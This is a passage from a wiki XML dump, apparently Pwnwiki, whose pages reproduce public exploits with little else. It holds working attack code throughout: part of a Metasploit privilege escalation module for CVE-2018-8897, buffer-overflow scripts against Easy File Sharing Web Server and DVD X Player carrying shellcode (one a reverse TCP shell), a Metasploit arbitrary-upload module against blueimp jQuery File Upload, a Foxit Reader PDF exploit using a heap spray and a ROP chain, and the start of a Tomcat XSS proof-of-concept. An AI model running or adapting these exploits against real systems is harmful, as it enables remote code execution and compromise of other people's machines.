      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
      raise Msf::Exploit::Failed, 'Could not connect to session'
    end
  end

  def validate_remote_path(path)
    unless directory?(path)
      fail_with(Failure::Unreachable, "#{path} does not exist on the target")
    end
  end

  def validate_target
    if sysinfo['Architecture'] == ARCH_X86
      fail_with(Failure::NoTarget, 'Exploit code is 64-bit only')
    end
    if sysinfo['OS'] =~ /XP/
      fail_with(Failure::Unknown, 'The exploit binary does not support Windows XP')
    end
  end

  def ensure_clean_destination(path)
    if file?(path)
      print_status("#{path} already exists on the target. Deleting...")
      begin
        file_rm(path)
        print_status("Deleted #{path}")
      rescue Rex::Post::Meterpreter::RequestError =&gt; e
        elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
        print_error("Unable to delete #{path}")
      end
    end
  end

  def ensure_clean_exploit_destination
    ensure_clean_destination(exploit_path)
  end

  def ensure_clean_payload_destination
    ensure_clean_destination(payload_path)
  end

  def upload_exploit
    local_exploit_path = ::File.join(Msf::Config.data_directory, 'exploits', 'cve-2018-8897-exe', 'cve-2018-8897-exe.exe')
    upload_file(exploit_path, local_exploit_path)
    print_status("Exploit uploaded on #{sysinfo['Computer']} to #{exploit_path}")
  end

  def upload_payload
    write_file(payload_path, payload_exe)
    print_status("Payload (#{payload_exe.length} bytes) uploaded on #{sysinfo['Computer']} to #{payload_path}")
  end

  def execute_exploit
    sleep(datastore['EXECUTE_DELAY'])
    print_status("Running exploit #{exploit_path} with payload #{payload_path}")
    output = cmd_exec('cmd.exe', "/c #{exploit_path} #{payload_path}")
    vprint_status(output)
  end

  def exploit
    begin
      validate_active_host
      validate_target
      validate_remote_path(temp_path)
      ensure_clean_exploit_destination
      ensure_clean_payload_destination
      upload_exploit
      upload_payload
      execute_exploit
    rescue Rex::Post::Meterpreter::RequestError =&gt; e
      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
      print_error(e.message)
      ensure_clean_exploit_destination
      ensure_clean_payload_destination
    end
  end

  attr_reader :exploit_name
  attr_reader :payload_name
  attr_reader :payload_exe
  attr_reader :temp_path
  attr_reader :payload_path
  attr_reader :exploit_path
end
&lt;/pre&gt;</text>
      <sha1>5u2l4a9e276yh19sw2oawidhffoqseb</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-9059 Easy File Sharing Web Server 7.2 緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>1220</id>
    <revision>
      <id>1525</id>
      <timestamp>2021-04-11T02:02:47Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Easy File Sharing Web Server 7.2 stack buffer overflow # Date: 03/24/2018 # Exploit Author: rebeyond - http://www.rebeyond.net # Vendor Homepage..."</comment>
      <origin>1525</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3138" sha1="g5ihcf045p111mheeabtblg1cvmdiha" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Easy File Sharing Web Server 7.2 stack buffer overflow
# Date: 03/24/2018
# Exploit Author: rebeyond - http://www.rebeyond.net
# Vendor Homepage: http://www.sharing-file.com/
# Software Link: http://www.sharing-file.com/efssetup.exe
# Version: 7.2
# CVE: CVE-2018-9059
# Tested on: Windows XP Professional SP3
#
# Description:
# Attackers just need to construct a malicious login request packet,and send the packet to the server.The server can be pwned
#
#
# The stack trace is as follows:
# (40d8.2980): Access violation - code c0000005 (first chance)
# r
# eax=41414141 ebx=00000001 ecx=ffffffff edx=08fb62a0 esi=08fb6280 edi=08fb62a0
# eip=61c277f6 esp=08fb61fc ebp=08fb6214 iopl=0         nv up ei pl nz na pe nc
# cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
# *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\EFS Software\Easy File Sharing Web Server\sqlite3.dll -
# sqlite3!sqlite3_errcode+0x8e:
# 61c277f6 81784c97a629a0  cmp     dword ptr [eax+4Ch],0A029A697h ds:002b:4141418d=????????
#
# kb
# ChildEBP RetAddr  Args to Child
# WARNING: Stack unwind information not available. Following frames may be wrong.
# 083b6214 61c6286c 00001183 0000115d 085c4d44 sqlite3!sqlite3_errcode+0x8e
# *** WARNING: Unable to verify checksum for fsws.exe
# *** ERROR: Module load completed but symbols could not be loaded for fsws.exe
# 083b6254 004968f4 00000001 00000000 083b6280 sqlite3!sqlite3_declare_vtab+0x3282
# 083b6274 004975a3 083b6298 00000000 083b75fc fsws+0x968f4
# 00000000 00000000 00000000 00000000 00000000 fsws+0x975a3


import requests
host='192.168.50.30'
port='80'

buf='A'*4071
buf +='\x12\x45\xfa\x7f' #jmp esp
buf +='A'*12
buf +='\xeb\x36'  #jmp 0x36
buf +='A'*42
buf +='\x60\x30\xc7\x61'*2 #must be valid address
buf +='A'*4
#shellcode to execute calc.exe on remote server
buf += "\xdb\xdc\xd9\x74\x24\xf4\x58\xbb\x24\xa7\x26\xec\x33"
buf += "\xc9\xb1\x31\x31\x58\x18\x03\x58\x18\x83\xe8\xd8\x45"
buf += "\xd3\x10\xc8\x08\x1c\xe9\x08\x6d\x94\x0c\x39\xad\xc2"
buf += "\x45\x69\x1d\x80\x08\x85\xd6\xc4\xb8\x1e\x9a\xc0\xcf"
buf += "\x97\x11\x37\xe1\x28\x09\x0b\x60\xaa\x50\x58\x42\x93"
buf += "\x9a\xad\x83\xd4\xc7\x5c\xd1\x8d\x8c\xf3\xc6\xba\xd9"
buf += "\xcf\x6d\xf0\xcc\x57\x91\x40\xee\x76\x04\xdb\xa9\x58"
buf += "\xa6\x08\xc2\xd0\xb0\x4d\xef\xab\x4b\xa5\x9b\x2d\x9a"
buf += "\xf4\x64\x81\xe3\x39\x97\xdb\x24\xfd\x48\xae\x5c\xfe"
buf += "\xf5\xa9\x9a\x7d\x22\x3f\x39\x25\xa1\xe7\xe5\xd4\x66"
buf += "\x71\x6d\xda\xc3\xf5\x29\xfe\xd2\xda\x41\xfa\x5f\xdd"
buf += "\x85\x8b\x24\xfa\x01\xd0\xff\x63\x13\xbc\xae\x9c\x43"
buf += "\x1f\x0e\x39\x0f\x8d\x5b\x30\x52\xdb\x9a\xc6\xe8\xa9"
buf += "\x9d\xd8\xf2\x9d\xf5\xe9\x79\x72\x81\xf5\xab\x37\x7d"
buf += "\xbc\xf6\x11\x16\x19\x63\x20\x7b\x9a\x59\x66\x82\x19"
buf += "\x68\x16\x71\x01\x19\x13\x3d\x85\xf1\x69\x2e\x60\xf6"
buf += "\xde\x4f\xa1\x95\x81\xc3\x29\x74\x24\x64\xcb\x88"

cookies = dict(SESSIONID='6771', UserID=buf,PassWD='')
data=dict(frmLogin='',frmUserName='',frmUserPass='',login='')
requests.post('http://'+host+':'+port+'/forum.ghp',cookies=cookies,data=data)
&lt;/pre&gt;</text>
      <sha1>g5ihcf045p111mheeabtblg1cvmdiha</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-9128 DVD X Player 5.5.3 - '.plf' 緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>1623</id>
    <revision>
      <id>2027</id>
      <timestamp>2021-05-02T04:49:32Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; #!/usr/bin/env python  # Exploit Title: DVD X Player 5.5.3 Buffer Overflow # Date: 20.03.2019 # Exploit Author: Paolo Perego - paolo@armoredcode.com # Vendor Hom..."</comment>
      <origin>2027</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3045" sha1="pxcl5h3i96mkyj8ocexzetyvh3pg7mz" xml:space="preserve">==EXP==
&lt;pre&gt;
#!/usr/bin/env python

# Exploit Title: DVD X Player 5.5.3 Buffer Overflow
# Date: 20.03.2019
# Exploit Author: Paolo Perego - paolo@armoredcode.com
# Vendor Homepage: http://www.dvd-x-player.com
# Software Link: http://www.dvd-x-player.com/download/DVDXPlayerSetup-Standard.exe
# Version: 5.5.3.8 and above
# Tested on: Windows 7 Professional SP1 x86
# CVE : CVE-2018-9128
# Similiar EDB-ID: 44438 https://www.exploit-db.com/exploits/44438 
#   In Windows 7, SEH handler to be used contains a \x00 byte that it has been
#   obtained using a restricted char. For such a reason, every jump has to be
#   backward on the beginning of attacking shellcode.

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.106 LPORT=4444 -b '\x00\x0a\x1a\x0d' -f py -v shellcode

shellcode = ""
shellcode += "\xb8\xb8\xfa\xed\xbb\xda\xc1\xd9\x74\x24\xf4\x5a"
shellcode += "\x33\xc9\xb1\x52\x31\x42\x12\x03\x42\x12\x83\x7a"
shellcode += "\xfe\x0f\x4e\x86\x17\x4d\xb1\x76\xe8\x32\x3b\x93"
shellcode += "\xd9\x72\x5f\xd0\x4a\x43\x2b\xb4\x66\x28\x79\x2c"
shellcode += "\xfc\x5c\x56\x43\xb5\xeb\x80\x6a\x46\x47\xf0\xed"
shellcode += "\xc4\x9a\x25\xcd\xf5\x54\x38\x0c\x31\x88\xb1\x5c"
shellcode += "\xea\xc6\x64\x70\x9f\x93\xb4\xfb\xd3\x32\xbd\x18"
shellcode += "\xa3\x35\xec\x8f\xbf\x6f\x2e\x2e\x13\x04\x67\x28"
shellcode += "\x70\x21\x31\xc3\x42\xdd\xc0\x05\x9b\x1e\x6e\x68"
shellcode += "\x13\xed\x6e\xad\x94\x0e\x05\xc7\xe6\xb3\x1e\x1c"
shellcode += "\x94\x6f\xaa\x86\x3e\xfb\x0c\x62\xbe\x28\xca\xe1"
shellcode += "\xcc\x85\x98\xad\xd0\x18\x4c\xc6\xed\x91\x73\x08"
shellcode += "\x64\xe1\x57\x8c\x2c\xb1\xf6\x95\x88\x14\x06\xc5"
shellcode += "\x72\xc8\xa2\x8e\x9f\x1d\xdf\xcd\xf7\xd2\xd2\xed"
shellcode += "\x07\x7d\x64\x9e\x35\x22\xde\x08\x76\xab\xf8\xcf"
shellcode += "\x79\x86\xbd\x5f\x84\x29\xbe\x76\x43\x7d\xee\xe0"
shellcode += "\x62\xfe\x65\xf0\x8b\x2b\x29\xa0\x23\x84\x8a\x10"
shellcode += "\x84\x74\x63\x7a\x0b\xaa\x93\x85\xc1\xc3\x3e\x7c"
shellcode += "\x82\x2b\x16\x46\x38\xc4\x65\xb6\xad\x48\xe3\x50"
shellcode += "\xa7\x60\xa5\xcb\x50\x18\xec\x87\xc1\xe5\x3a\xe2"
shellcode += "\xc2\x6e\xc9\x13\x8c\x86\xa4\x07\x79\x67\xf3\x75"
shellcode += "\x2c\x78\x29\x11\xb2\xeb\xb6\xe1\xbd\x17\x61\xb6"
shellcode += "\xea\xe6\x78\x52\x07\x50\xd3\x40\xda\x04\x1c\xc0"
shellcode += "\x01\xf5\xa3\xc9\xc4\x41\x80\xd9\x10\x49\x8c\x8d"
shellcode += "\xcc\x1c\x5a\x7b\xab\xf6\x2c\xd5\x65\xa4\xe6\xb1"
shellcode += "\xf0\x86\x38\xc7\xfc\xc2\xce\x27\x4c\xbb\x96\x58"
shellcode += "\x61\x2b\x1f\x21\x9f\xcb\xe0\xf8\x1b\xf5\x11\x30"
shellcode += "\xb6\x62\x88\xa1\xfb\xee\x2b\x1c\x3f\x17\xa8\x94"
shellcode += "\xc0\xec\xb0\xdd\xc5\xa9\x76\x0e\xb4\xa2\x12\x30"
shellcode += "\x6b\xc2\x36"

junk = "\x90" * (600 -len(shellcode))
junk += shellcode

# nasm &gt; jmp $-400
# 00000000  E96BFEFFFF        jmp 0xfffffe70
backflip="\x90\x90\x90\xE9\x6B\xFE\xFF\xFF"
junk += backflip

# 00401838  |. 5E             POP ESI
junk += "\xeb\xf6\x90\x90"
junk += "\x38\x18\x40\x1a"

file = open("evil_playlist.plf", "w")
file.write(junk)
file.close()
            
&lt;/pre&gt;</text>
      <sha1>pxcl5h3i96mkyj8ocexzetyvh3pg7mz</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-9206 blueimp jQuery任意文件上傳漏洞</title>
    <ns>0</ns>
    <id>474</id>
    <revision>
      <id>676</id>
      <timestamp>2021-03-27T02:38:49Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  class MetasploitModule..."</comment>
      <origin>676</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="5383" sha1="lwbv6q3v48uqwj1op1jsdxhd5wlkqut" xml:space="preserve">==EXP==
&lt;pre&gt;
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule &lt; Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::PhpEXE

  def initialize(info = {})
    super(update_info(info,
      'Name'           =&gt; "blueimp's jQuery (Arbitrary) File Upload",
      'Description'    =&gt; %q{
        This module exploits an arbitrary file upload in the sample PHP upload
        handler for blueimp's jQuery File Upload widget in versions &lt;= 9.22.0.

        Due to a default configuration in Apache 2.3.9+, the widget's .htaccess
        file may be disabled, enabling exploitation of this vulnerability.

        This vulnerability has been exploited in the wild since at least 2015
        and was publicly disclosed to the vendor in 2018. It has been present
        since the .htaccess change in Apache 2.3.9.

        This module provides a generic exploit against the jQuery widget.
      },
      'Author'         =&gt; [
        'Claudio Viviani',     # WordPress Work the Flow (Arbitrary) File Upload
        'Larry W. Cashdollar', # (Re)discovery, vendor disclosure, and PoC
        'wvu'                  # Metasploit module
      ],
      'References'     =&gt; [
        ['CVE', '2018-9206'],
        ['URL', 'http://www.vapidlabs.com/advisory.php?v=204'],
        ['URL', 'https://github.com/blueimp/jQuery-File-Upload/pull/3514'],
        ['URL', 'https://github.com/lcashdol/Exploits/tree/master/CVE-2018-9206'],
        ['URL', 'https://www.homelab.it/index.php/2015/04/04/wordpress-work-the-flow-file-upload-vulnerability/'],
        ['URL', 'https://github.com/rapid7/metasploit-framework/pull/5130'],
        ['URL', 'https://httpd.apache.org/docs/current/mod/core.html#allowoverride']
      ],
      'DisclosureDate' =&gt; 'Oct 9 2018', # Larry's disclosure to the vendor
      'License'        =&gt; MSF_LICENSE,
      'Platform'       =&gt; ['php', 'linux'],
      'Arch'           =&gt; [ARCH_PHP, ARCH_X86, ARCH_X64],
      'Privileged'     =&gt; false,
      'Targets'        =&gt; [
        ['PHP Dropper',   'Platform' =&gt; 'php',   'Arch' =&gt; ARCH_PHP],
        ['Linux Dropper', 'Platform' =&gt; 'linux', 'Arch' =&gt; [ARCH_X86, ARCH_X64]]
      ],
      'DefaultTarget'  =&gt; 0
    ))

    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/jQuery-File-Upload'])
    ])
  end

  def version_paths
    %w[
      /package.json
      /bower.json
    ].map { |u| normalize_uri(target_uri.path, u) }
  end

  # List from PoC sorted by frequency
  def upload_paths
    %w[
      /server/php/index.php
      /server/php/upload.class.php
      /server/php/UploadHandler.php
      /example/upload.php
      /php/index.php
    ].map { |u| normalize_uri(target_uri.path, u) }
  end

  def check
    a = nil

    version_paths.each do |u|
      vprint_status("Checking #{u}")

      res = send_request_cgi(
        'method' =&gt; 'GET',
        'uri'    =&gt; u
      )

      next unless res

      unless a
        res.headers['Server'] =~ /Apache\/([\d.]+)/ &amp;&amp;
          $1 &amp;&amp; (a = Gem::Version.new($1))

        if a &amp;&amp; a &gt;= Gem::Version.new('2.3.9')
          vprint_good("Found Apache #{a} (AllowOverride None may be set)")
        elsif a
          vprint_warning("Found Apache #{a} (AllowOverride All may be set)")
        end
      end

      next unless res.code == 200 &amp;&amp; (j = res.get_json_document) &amp;&amp;
                  j['version'] &amp;&amp; (v = Gem::Version.new(j['version']))

      if v &lt;= Gem::Version.new('9.22.0')
        vprint_good("Found unpatched jQuery File Upload #{v}")
        return CheckCode::Appears
      else
        vprint_error("Found patched jQuery File Upload #{v}")
        return CheckCode::Safe
      end
    end

    CheckCode::Unknown
  end

  def find_upload
    upload_paths.each do |u|
      vprint_status("Checking #{u}")

      res = send_request_cgi(
        'method' =&gt; 'GET',
        'uri'    =&gt; u
      )

      if res &amp;&amp; res.code == 200
        vprint_good("Found #{u}")
        return u
      end
    end

    nil
  end

  def exploit
    unless check == CheckCode::Appears &amp;&amp; (u = find_upload)
      fail_with(Failure::NotFound, 'Could not find target')
    end

    f = "#{rand_text_alphanumeric(8..42)}.php"
    p = normalize_uri(File.dirname(u), 'files', f)

    print_status('Uploading payload')
    res = upload_payload(u, f)

    unless res &amp;&amp; res.code == 200 &amp;&amp; res.body.include?(f)
      fail_with(Failure::NotVulnerable, 'Could not upload payload')
    end

    print_good("Payload uploaded: #{full_uri(p)}")

    print_status('Executing payload')
    exec_payload(p)

    print_status('Deleting payload')
    delete_payload(u, f)
  end

  def upload_payload(u, f)
    p = get_write_exec_payload(unlink_self: true)

    m = Rex::MIME::Message.new
    m.add_part(p, nil, nil, %(form-data; name="files[]"; filename="#{f}"))

    send_request_cgi(
      'method' =&gt; 'POST',
      'uri'    =&gt; u,
      'ctype'  =&gt; "multipart/form-data; boundary=#{m.bound}",
      'data'   =&gt; m.to_s
    )
  end

  def exec_payload(p)
    send_request_cgi({
      'method' =&gt; 'GET',
      'uri'    =&gt; p
    }, 1)
  end

  def delete_payload(u, f)
    send_request_cgi(
      'method'   =&gt; 'DELETE',
      'uri'      =&gt; u,
      'vars_get' =&gt; {'file' =&gt; f}
    )
  end

end

&lt;/pre&gt;</text>
      <sha1>lwbv6q3v48uqwj1op1jsdxhd5wlkqut</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-9958 Foxit Reader 9.0.1.1049 緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>1209</id>
    <revision>
      <id>1514</id>
      <timestamp>2021-04-11T01:28:07Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; %PDF  1 0 obj &lt;&lt;/Pages 1 0 R /OpenAction 2 0 R&gt;&gt;  2 0 obj &lt;&lt;/S /JavaScript /JS ( /* #----------------------------------------------------------------------------..."</comment>
      <origin>1514</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="9027" sha1="tqlejm989wu0x5y13d709p4r68hmxwp" xml:space="preserve">==EXP==
&lt;pre&gt;
%PDF 
1 0 obj
&lt;&lt;/Pages 1 0 R /OpenAction 2 0 R&gt;&gt; 
2 0 obj
&lt;&lt;/S /JavaScript /JS (
/*
#---------------------------------------------------------------------------------------------------#
# Exploit Title   : Foxit Reader RCE with DEP bypass on Heap with shellcode                         #
# Date            : 08/04/2018 (4 Aug)                                                              #
# Exploit Author  : Manoj Ahuje                                                                     #
# Tested on       : Windows 7 Pro (x32)                                                             #
# Software Link   : https://www.foxitsoftware.com/downloads/latest.php?product=Foxit-Reader&amp;platform=Windows&amp;version=9.0.1.1049&amp;package_type=exe&amp;language=English
# Version         : Foxit Reader 9.0.1.1049                                                         #
# CVE             : CVE-2018-9958, CVE-2018-9948                                                    #
# Credits to "Mr_Me" for Reseach and initial exploit                                                #
#---------------------------------------------------------------------------------------------------#
*/
var heap_ptr  = 0;
var foxit_base = 0;

function heap_spray(size){
    var arr = new Array(size);
    for (var i = 0; i &lt; arr.length; i++) {
    
        // re-claim and stack pivot-0x8
        arr[i] = new ArrayBuffer(0x10000-0x8);//0xFFF8
        var claimed = new Int32Array(arr[i]);
        var c_length = claimed.length;
   
/* custom made ROP chain virtualalloc call
   Author: Manoj Ahuje  */
	    
	claimed[0x00] = foxit_base + 0x01A65184; //# PUSH EAX # POP ESP # POP EDI # POP ESI # POP EBX # POP EBP # RETN
	claimed[0x01] = foxit_base + 0x01A65184;
	claimed[0x02] = foxit_base + 0x01A65184;
	claimed[0x03] = foxit_base + 0x01A65184;
    claimed[0x04] = foxit_base + 0x14f9195;  // # POP EBX # RETN
    claimed[0x05] = foxit_base + 0x41414141; // 
	claimed[0x06] = foxit_base + 0x1f224fc;  // # ptr to &amp;VirtualProtect()
        claimed[0x07] = foxit_base + 0x0e70281;  // # MOV ESI,DWORD PTR DS:[EBX] # RETN 
        claimed[0x08] = foxit_base + 0x1582698;  // # POP EBP # RETN 
        claimed[0x09] = foxit_base + 0xa0dbd;    // # &amp; jmp esp 
        claimed[0x0a] = foxit_base + 0x14ed06d;  // # POP EBX # RETN  
        claimed[0x0b] = 0x00000201;              // # 0x00000201-&gt; ebx
        claimed[0x0c] = foxit_base + 0x1e62f7e;  // # POP EDX # RETN  
        claimed[0x0d] = 0x00000040;              // # 0x00000040-&gt; edx
        claimed[0x0e] = foxit_base + 0x1ec06a9;  // # POP ECX # RETN 
        claimed[0x0f] = foxit_base + 0x29bac74;  // # &amp;Writable location 
        claimed[0x10] = foxit_base + 0xb971f;    // # POP EDI # RETN  
        claimed[0x11] = foxit_base + 0x177769e;  // # RETN (ROP NOP) 
        claimed[0x12] = foxit_base + 0x1A89808;  // # POP EAX # RETN 
        claimed[0x13] = 0x90909090;              // # nop
        claimed[0x14] = foxit_base + 0x129d4f0;  // # PUSHAD # RETN  
	claimed[0x15] = 0x90909090;
	claimed[0x16] = 0x90909090;
	claimed[0x17] = 0x90909090;
	claimed[0x18] = 0x90909090;
	claimed[0x19] = 0x90909090;
	claimed[0x1a] = 0x90909090;
	    
//regular CALCULATOR shellcode from msf
	    
        claimed[0x1b] = 0xe5d9e389;
        claimed[0x1c] = 0x5af473d9;
        claimed[0x1d] = 0x4a4a4a4a;
        claimed[0x1e] = 0x4a4a4a4a;
        claimed[0x1f] = 0x434a4a4a;
        claimed[0x20] = 0x43434343;
        claimed[0x21] = 0x59523743;
        claimed[0x22] = 0x5058416a;
        claimed[0x23] = 0x41304130;
        claimed[0x24] = 0x5141416b;
        claimed[0x25] = 0x32424132;
        claimed[0x26] = 0x42304242;
        claimed[0x27] = 0x58424142;
        claimed[0x28] = 0x42413850;
        claimed[0x29] = 0x49494a75;
        claimed[0x2a] = 0x4e586b6c;
        claimed[0x2b] = 0x57306362;
        claimed[0x2c] = 0x53707770;
        claimed[0x2d] = 0x6b696e50;
        claimed[0x2e] = 0x39716455;
        claimed[0x2f] = 0x6e645050;
        claimed[0x30] = 0x6470426b;
        claimed[0x31] = 0x434b6c70;
        claimed[0x32] = 0x6e6c3662;
        claimed[0x33] = 0x7562436b;
        claimed[0x34] = 0x526b6e44;
        claimed[0x35] = 0x46686452;
        claimed[0x36] = 0x5037386f;
        claimed[0x37] = 0x6446764a;
        claimed[0x38] = 0x4e4f4b71;
        claimed[0x39] = 0x354c774c;
        claimed[0x3a] = 0x776c6131;
        claimed[0x3b] = 0x374c7672;
        claimed[0x3c] = 0x5a614a50;
        claimed[0x3d] = 0x374d746f;
        claimed[0x3e] = 0x38573971;
        claimed[0x3f] = 0x30525a62;
        claimed[0x40] = 0x6e376652;
        claimed[0x41] = 0x6252506b;
        claimed[0x42] = 0x624b6c30;
        claimed[0x43] = 0x6c4c576a;
        claimed[0x44] = 0x476c524b;
        claimed[0x45] = 0x6d387461;
        claimed[0x46] = 0x43587133;
        claimed[0x47] = 0x50513831;
        claimed[0x48] = 0x334b6c51;
        claimed[0x49] = 0x35506769;
        claimed[0x4a] = 0x6e534851;
        claimed[0x4b] = 0x7539576b;
        claimed[0x4c] = 0x54736948;
        claimed[0x4d] = 0x4e79637a;
        claimed[0x4e] = 0x6c64356b;
        claimed[0x4f] = 0x6a51354b;
        claimed[0x50] = 0x39514676;
        claimed[0x51] = 0x6f4c6e6f;
        claimed[0x52] = 0x444f4831;
        claimed[0x53] = 0x4861364d;
        claimed[0x54] = 0x6b783447;
        claimed[0x55] = 0x69357450;
        claimed[0x56] = 0x73337366;
        claimed[0x57] = 0x5568494d;
        claimed[0x58] = 0x474d436b;
        claimed[0x59] = 0x68357454;
        claimed[0x5a] = 0x4e686364;
        claimed[0x5b] = 0x6638466b;
        claimed[0x5c] = 0x59313344;
        claimed[0x5d] = 0x6c766143;
        claimed[0x5e] = 0x506c664b;
        claimed[0x5f] = 0x504b4c4b;
        claimed[0x60] = 0x656c4758;
        claimed[0x61] = 0x6c436951;
        claimed[0x62] = 0x6e34634b;
        claimed[0x63] = 0x6831436b;
        claimed[0x64] = 0x61694e50;
        claimed[0x65] = 0x65746554;
        claimed[0x66] = 0x514b5174;
        claimed[0x67] = 0x7351734b;
        claimed[0x68] = 0x427a6269;
        claimed[0x69] = 0x396f6971;
        claimed[0x6a] = 0x734f5170;
        claimed[0x6b] = 0x4e6a436f;
        claimed[0x6c] = 0x7832526b;
        claimed[0x6d] = 0x316d4e6b;
        claimed[0x6e] = 0x675a534d;
        claimed[0x6f] = 0x4f4d6c71;
        claimed[0x70] = 0x57324875;
        claimed[0x71] = 0x43707770;
        claimed[0x72] = 0x61306630;
        claimed[0x73] = 0x6e514678;
        claimed[0x74] = 0x6e6f706b;
        claimed[0x75] = 0x6b6f5967;
        claimed[0x76] = 0x784b4f65;
        claimed[0x77] = 0x39656d70;
        claimed[0x78] = 0x73565032;
        claimed[0x79] = 0x6c666c58;
        claimed[0x7a] = 0x6d6d4d55;
        claimed[0x7b] = 0x496f494d;
        claimed[0x7c] = 0x456c6545;
        claimed[0x7d] = 0x454c7356;
        claimed[0x7e] = 0x6b306b5a;
        claimed[0x7f] = 0x5370394b;
        claimed[0x80] = 0x4d453445;
        claimed[0x81] = 0x6567426b;
        claimed[0x82] = 0x70426343;
        claimed[0x83] = 0x376a506f;
        claimed[0x84] = 0x6b336670;
        claimed[0x85] = 0x3045694f;
        claimed[0x86] = 0x72313563;
        claimed[0x87] = 0x7633654c;
        claimed[0x88] = 0x4235754e;
        claimed[0x89] = 0x67354558;
        claimed[0x8a] = 0x00414170;

        for (var j = 0x8b; j &lt; c_length; j++) {
            claimed[j] = 0x6d616e6a;
        }
    }
}

function leak(){
    /*
        Foxit Reader Typed Array Uninitialized Pointer Information Disclosure Vulnerability
        ZDI-CAN-5380 / ZDI-18-332 / CVE-2018-9948
        Found By: bit from meepwn team
    */

    // alloc
    var a = this.addAnnot({type: "Text"});

    // free
    a.destroy();

    // reclaim
    var test = new ArrayBuffer(0x60);
    var stolen = new Int32Array(test);

    // leak the vftable
    var leaked = stolen[0] &amp; 0xffff0000;

    // a hard coded offset to FoxitReader.exe base v9.0.1.1049 (sha1: a01a5bde0699abda8294d73544a1ec6b4115fa68)
    foxit_base = leaked-0x01f50000;
}

function reclaim(){

    var arr = new Array(0x10);
    for (var i = 0; i &lt; arr.length; i++) {
        arr[i] = new ArrayBuffer(0x60);
        var rop = new Int32Array(arr[i]);
		
        rop[0x00] = 0x11000048;
        
        for (var j = 0x01; j &lt; rop.length; j++) {
            rop[j] = 0x71727374;
        }
    }
}

function trigger_uaf(){
    /*
        Foxit Reader Text Annotations point Use-After-Free Remote Code Execution Vulnerability
        ZDI-CAN-5620 / ZDI-18-342 / CVE-2018-9958
        Found By: Steven Seeley (mr_me) of Source Incite
    */

    var that = this;
    var a = this.addAnnot({type:"Text", page: 0, name:"uaf"});
    var arr = [1];
    Object.defineProperties(arr,{
        "0":{ 
            get: function () {

                // free
                that.getAnnot(0, "uaf").destroy();

                // reclaim freed memory
                reclaim();
                return 1; 
            }
        }
    });
    a.point = arr;
}

leak();
heap_spray(0x1000);

trigger_uaf();

)&gt;&gt; trailer &lt;&lt;/Root 1 0 R&gt;&gt;

&lt;/pre&gt;</text>
      <sha1>tqlejm989wu0x5y13d709p4r68hmxwp</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-0221 Apache Tomcat 9.0.0.M1 XSS漏洞</title>
    <ns>0</ns>
    <id>6254</id>
    <revision>
      <id>7175</id>
      <timestamp>2021-07-13T14:20:38Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==影響版本== &lt;/translate&gt; Version: Apache Tomcat 9.0.0.M1 to 9.0.0.17, 8.5.0 to 8.5.39, and 7.0.0 to 7.0.93   ==XSS== &lt;pre&gt; # Exploit Title: Apac..."</comment>
      <origin>7175</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1582" sha1="pkit8m38cfejsicojgr3qvblqu373dd" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本==
&lt;/translate&gt;
Version: Apache Tomcat 9.0.0.M1 to 9.0.0.17, 8.5.0 to 8.5.39, and 7.0.0 to 7.0.93


==XSS==
&lt;pre&gt;
# Exploit Title: Apache Tomcat 9.0.0.M1 - Cross-Site Scripting (XSS)
# Date: 05/21/2019
# Exploit Author: Central InfoSec
# Version: Apache Tomcat 9.0.0.M1 to 9.0.0.17, 8.5.0 to 8.5.39, and 7.0.0 to 7.0.93
# CVE : CVE-2019-0221

# Requirements:

# SSI support must be enabled within Apache Tomcat. SSI support is not enabled by default.

# A file (usually "*.shtml") with the "printenv" SSI directive must exist within the web application.

# The file must be accessible.



# Proof of Concept:

# Install a Java Runtime Environment (JRE)

# Download a vulnerable version of Tomcat and extract the contents

# Modify line 19 of the conf\context.xml file to globally enable privileged context
Context privileged="true"&gt;

# Modify conf\web.xml to enable the SSI Servlet as per the Apache Tomcat User Guide

# Put the following code in "webapps/ROOT/ssi/printenv.shtml"
&lt;html&gt;
  &lt;body&gt;
    Echo: &lt;!-- #echo var="QUERY_STRING_UNESCAPED" --&gt; &lt;br/&gt; &lt;br/&gt;
    Printenv: &lt;!-- #printenv --&gt;
  &lt;/body&gt;
&lt;/html&gt;

# Run Tomcat
cd bin
catalina run

